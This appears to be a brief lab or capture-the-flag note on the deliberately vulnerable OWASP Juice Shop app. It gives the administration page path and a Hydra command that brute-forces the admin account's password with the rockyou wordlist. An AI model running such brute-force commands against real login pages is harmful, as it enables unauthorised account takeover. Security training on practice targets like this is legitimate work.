1-	The admin path  (https://juiceshop.herokuapp.com/#/administration)  
![{C5EB1965-CD9A-44E5-AD11-74A08718781B}](https://github.com/user-attachments/assets/1516fbdb-efe2-4b2e-a878-2ff7e3905850)



(hydra -l admin@juice-sh.op -P  /usr/share/wordlists/rockyou.txt juice-shop.herokuapp.com httppost-form  
"/rest/user/login:email=^USER^&password=^PASS^:F=Invalid email or password" -V -I -F 
